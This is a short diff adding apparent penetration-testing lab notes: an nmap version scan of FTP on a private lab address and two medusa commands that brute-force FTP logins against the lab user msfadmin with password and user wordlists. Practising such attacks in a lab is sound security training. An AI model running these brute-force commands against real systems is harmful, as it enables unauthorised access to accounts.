@@ -1,0 +1,8 @@
+# FTP service enumeration
+nmap -p 21 -sV 192.168.56.101
+
+# FTP brute force attack using a specific user
+medusa -h 192.168.56.101 -u msfadmin -P ../wordlists/passwords.txt -M ftp
+
+# FTP brute force attack using a list of users
+medusa -h 192.168.56.101 -U ../wordlists/users.txt -P ../wordlists/passwords.txt -M ftp
